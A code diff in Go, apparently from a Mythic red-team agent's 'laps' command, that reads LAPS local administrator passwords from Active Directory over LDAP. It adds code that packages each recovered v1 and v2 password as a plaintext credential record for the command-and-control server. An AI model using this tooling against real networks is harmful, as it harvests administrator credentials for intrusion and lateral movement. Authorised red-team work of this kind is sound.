@@ -138,13 +138,17 @@ func (c *LapsCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	output := formatLAPSResults(result, baseDN, args.Filter)
+	output, creds := formatLAPSResults(result, baseDN, args.Filter)
 
-	return structs.CommandResult{
+	cmdResult := structs.CommandResult{
 		Output:    output,
 		Status:    "success",
 		Completed: true,
 	}
+	if len(creds) > 0 {
+		cmdResult.Credentials = &creds
+	}
+	return cmdResult
 }
 
 // filetimeToTime converts a Windows FILETIME (100-ns intervals since 1601-01-01) to Go time.
@@ -167,8 +171,9 @@ func lapsExpiryStatus(expTime time.Time) string {
 	return fmt.Sprintf("expires in %dh", hours)
 }
 
-func formatLAPSResults(result *ldap.SearchResult, baseDN, filter string) string {
+func formatLAPSResults(result *ldap.SearchResult, baseDN, filter string) (string, []structs.MythicCredential) {
 	var sb strings.Builder
+	var creds []structs.MythicCredential
 
 	sb.WriteString("LAPS Password Recovery\n")
 	sb.WriteString(fmt.Sprintf("Base DN: %s\n", baseDN))
@@ -184,7 +189,7 @@ func formatLAPSResults(result *ldap.SearchResult, baseDN, filter string) string 
 		sb.WriteString("  - LAPS is not deployed in this domain\n")
 		sb.WriteString("  - Current account lacks Read permission on LAPS attributes\n")
 		sb.WriteString("  - No computers match the filter\n")
-		return sb.String()
+		return sb.String(), nil
 	}
 
 	for i, entry := range result.Entries {
@@ -212,6 +217,12 @@ func formatLAPSResults(result *ldap.SearchResult, baseDN, filter string) string 
 					sb.WriteString(fmt.Sprintf("    Expires:  %s (%s)\n", expTime.Format("2006-01-02 15:04 UTC"), lapsExpiryStatus(expTime)))
 				}
 			}
+			creds = append(creds, structs.MythicCredential{
+				CredentialType: "plaintext",
+				Account:        name,
+				Credential:     v1Pass,
+				Comment:        "laps (v1)",
+			})
 		}
 
 		// Windows LAPS v2 (plaintext JSON)
@@ -231,6 +242,16 @@ func formatLAPSResults(result *ldap.SearchResult, baseDN, filter string) string 
 				if v2.Timestamp != "" {
 					sb.WriteString(fmt.Sprintf("    Updated:  %s\n", v2.Timestamp))
 				}
+				credAccount := account
+				if credAccount == "" {
+					credAccount = name
+				}
+				creds = append(creds, structs.MythicCredential{
+					CredentialType: "plaintext",
+					Account:        credAccount,
+					Credential:     v2.Password,
+					Comment:        "laps (v2)",
+				})
 			} else {
 				sb.WriteString(fmt.Sprintf("    Password: %s  (LAPS v2 raw)\n", v2Pass))
 			}
@@ -249,5 +270,5 @@ func formatLAPSResults(result *ldap.SearchResult, baseDN, filter string) string 
 		}
 	}
 
-	return sb.String()
+	return sb.String(), creds
 }
